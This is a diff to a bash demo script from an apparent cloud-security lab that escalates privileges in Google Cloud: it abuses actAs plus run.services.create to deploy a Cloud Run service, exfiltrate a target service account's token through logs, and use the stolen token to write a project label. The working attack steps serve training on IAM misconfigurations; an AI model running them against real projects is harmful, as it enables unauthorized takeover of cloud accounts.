@@ -3,7 +3,7 @@
 # Demo script for gcp-cloudrun-001-iam-serviceaccountsactas+run-servicescreate
 #
 # Attack: starting_sa holds iam.serviceAccounts.actAs on target_sa plus
-# run.services.create on the project (via a minimal custom role). It deploys a
+# run.services.create on the project (via minimal custom roles). It deploys a
 # new Cloud Run service bound to target_sa using a PUBLIC Docker Hub image
 # (docker.io/library/python:3.13-slim) — no Artifact Registry access is
 # needed, which is the crux of the technique. An inline Python payload
@@ -48,6 +48,13 @@
 #     (fetch the service URL via urls[]) + run.operations.get (poll the async
 #     LRO) + logging.logEntries.list (read the exfiltrated token from the
 #     logs). Demonstrates the exact minimal permission surface of the attack.
+#
+# Re-running / switching modes: both modes use the same deterministic
+# SERVICE_NAME. gcloud mode re-deploys in place (its helpful run.services.update
+# covers the update path), but the raw --api-only create has no update fallback
+# and returns 409 ALREADY_EXISTS if the service already exists. --api-only mode
+# therefore pre-checks for an existing service and tells you to run
+# cleanup_attack.sh first rather than failing deep in the deploy.
 #
 # Credential model (no static SA keys):
 #   Terraform granted YOUR ADC identity serviceAccountTokenCreator on starting_sa.
@@ -257,12 +264,27 @@ echo -e "${YELLOW}Step 2: Confirming starting SA identity and lack of project pr
 echo -e "\n${DIM}Step 2a (illustrative — proving we act as the starting SA):${NC}"
 show_illustrative_cmd "YOUR ADC (${DEPLOYER_EMAIL})" \
     "gcloud auth print-access-token --impersonate-service-account=$STARTING_SA_EMAIL"
-STARTING_SA_TOKEN=$(gcloud auth print-access-token \
-    --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
-if [ -z "$STARTING_SA_TOKEN" ]; then
-    echo -e "${RED}✗ Could not mint token for starting SA (check the deployer grant)${NC}"
-    exit 1
-fi
+# Retry the first impersonation: right after `plabs apply` the deployer's
+# serviceAccountTokenCreator grant on starting_sa can take up to ~90s to
+# propagate, longer than the fixed 15s wait above. Retrying here (rather than
+# lengthening the wait for everyone) keeps a warm deployment fast while still
+# tolerating a cold one. Once this first mint succeeds, every later
+# impersonation in the demo works immediately.
+STARTING_SA_TOKEN=""
+for attempt in $(seq 1 8); do
+    STARTING_SA_TOKEN=$(gcloud auth print-access-token \
+        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
+    [ -n "$STARTING_SA_TOKEN" ] && break
+    if [ "$attempt" -eq 8 ]; then
+        echo -e "${RED}✗ Could not mint token for starting SA after ~90s (check the deployer grant)${NC}"
+        echo "The deployer ($DEPLOYER_EMAIL) needs roles/iam.serviceAccountTokenCreator on"
+        echo "$STARTING_SA_EMAIL. If you just ran 'plabs apply', the grant may still be"
+        echo "propagating — wait a moment and re-run."
+        exit 1
+    fi
+    echo -e "${DIM}  Token mint denied (IAM grant still propagating) — retrying in 12s... ($((attempt * 12))s elapsed)${NC}"
+    sleep 12
+done
 show_cmd "$STARTING_SA_EMAIL (via tokeninfo)" \
     "curl -s 'https://oauth2.googleapis.com/tokeninfo?access_token=<redacted>'"
 TOKEN_INFO=$(curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=${STARTING_SA_TOKEN}")
@@ -376,6 +398,21 @@ else
         exit 1
     fi
 
+    # Pre-check: the raw create (POST) has no update fallback, so a service left
+    # behind by a prior run or by gcloud mode makes it fail with 409
+    # ALREADY_EXISTS. starting_sa holds run.services.get, so probe first and give
+    # an actionable message instead of a deep-in-the-deploy error.
+    PRE_GET_CODE=$(curl -s -o /dev/null -w '%{http_code}' \
+        -H "Authorization: Bearer $ACCESS_TOKEN" \
+        "https://run.googleapis.com/v2/projects/${PROJECT_ID}/locations/${REGION}/services/${SERVICE_NAME}")
+    if [ "$PRE_GET_CODE" = "200" ]; then
+        echo -e "${RED}✗ A Cloud Run service named '$SERVICE_NAME' already exists.${NC}"
+        echo "The raw API create cannot update an existing service (unlike gcloud mode)."
+        echo "This usually means a previous run — or the default gcloud mode — left it behind."
+        echo -e "${YELLOW}Run ./cleanup_attack.sh first, then re-run with --api-only.${NC}"
+        exit 1
+    fi
+
     # (a) Create the service — requires run.services.create + iam.serviceAccounts.actAs.
     # No Artifact Registry interaction at all: the public Docker Hub image is
     # pulled directly by Cloud Run at instance start.
@@ -404,6 +441,9 @@ else
     if [ -z "$OPERATION_NAME" ] || [ -n "$CREATE_ERROR" ]; then
         echo -e "${RED}✗ Service create failed${NC}"
         echo "Response: $CREATE_RESPONSE"
+        if echo "$CREATE_ERROR" | grep -qi 'already exists'; then
+            echo -e "${YELLOW}The service already exists. Run ./cleanup_attack.sh first, then re-run.${NC}"
+        fi
         exit 1
     fi
 
@@ -580,32 +620,46 @@ fi
 echo -e "${GREEN}✓ Confirmed: exfiltrated token belongs to $TARGET_SA_EMAIL${NC}\n"
 
 # Step 7: [EXPLOIT] Confirm editor-level write access using the raw stolen
-# token (project label write/remove round-trip) — not gcloud impersonation.
+# token (project label write/restore round-trip) — not gcloud impersonation.
+# Uses the Resource Manager v1 projects.update method: a synchronous HTTP PUT
+# of the full Project resource (resourcemanager.projects.update, which
+# roles/editor includes). Note: v1 update is PUT-with-full-resource, NOT a
+# PATCH+updateMask — that shape belongs to the async v3 API and silently no-ops
+# against v1. Success is keyed on the HTTP status (200 = authorized, 403 =
+# denied/viewer-only), not the response body shape.
 echo -e "${YELLOW}Step 7: [EXPLOIT] Verifying roles/editor write access via raw stolen token${NC}"
 show_cmd "$TARGET_SA_EMAIL (via exfiltrated token)" \
-    "curl -X PATCH 'https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT_ID?updateMask=labels' -H 'Authorization: Bearer <redacted>' -d '{\"labels\": {...}}'"
+    "curl -X PUT 'https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT_ID' -H 'Authorization: Bearer <redacted>' -d '<project JSON with added label>'"
 
 CURRENT_PROJECT_JSON=$(curl -s -H "Authorization: Bearer ${EXFILTRATED_TOKEN}" \
     "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}")
-CURRENT_LABELS=$(echo "$CURRENT_PROJECT_JSON" | jq -c '.labels // {}')
-UPDATED_LABELS=$(echo "$CURRENT_LABELS" | jq -c '. + {"pl-privesc-verified": "true"}')
+# Build the full updated resource (v1 update replaces the whole Project).
+UPDATED_PROJECT_JSON=$(echo "$CURRENT_PROJECT_JSON" \
+    | jq -c '.labels = ((.labels // {}) + {"pl-privesc-verified": "true"})')
 
-PATCH_RESPONSE=$(curl -s -X PATCH \
+PUT_RESPONSE=$(curl -s -w $'\n%{http_code}' -X PUT \
     -H "Authorization: Bearer ${EXFILTRATED_TOKEN}" \
     -H "Content-Type: application/json" \
-    -d "{\"labels\": ${UPDATED_LABELS}}" \
-    "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}?updateMask=labels")
+    -d "$UPDATED_PROJECT_JSON" \
+    "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}")
+PUT_CODE=$(echo "$PUT_RESPONSE" | tail -1)
+PUT_BODY=$(echo "$PUT_RESPONSE" | sed '$d')
 
-if echo "$PATCH_RESPONSE" | jq -e '.name' >/dev/null 2>&1; then
+if [ "$PUT_CODE" = "200" ]; then
     echo -e "${GREEN}✓ Successfully wrote a project label using the exfiltrated token!${NC}"
     echo -e "${GREEN}✓ PROJECT EDITOR ACCESS CONFIRMED (roles/editor)${NC}"
-    curl -s -X PATCH \
+    # Restore the original labels (PUT the pre-change resource back).
+    curl -s -X PUT \
         -H "Authorization: Bearer ${EXFILTRATED_TOKEN}" \
         -H "Content-Type: application/json" \
-        -d "{\"labels\": ${CURRENT_LABELS}}" \
-        "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}?updateMask=labels" > /dev/null 2>&1 || true
+        -d "$CURRENT_PROJECT_JSON" \
+        "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}" > /dev/null 2>&1 || true
+elif [ "$PUT_CODE" = "403" ]; then
+    echo -e "${YELLOW}Note: project label write denied (403) — the stolen token lacks${NC}"
+    echo -e "${YELLOW}resourcemanager.projects.update; the flag read below is the primary proof${NC}"
 else
-    echo -e "${YELLOW}Note: label write skipped (may require resourcemanager.projects.update)${NC}"
+    echo -e "${YELLOW}Note: project label write returned HTTP $PUT_CODE${NC}"
+    echo "Response: $(echo "$PUT_BODY" | head -3)"
 fi
 echo ""
 
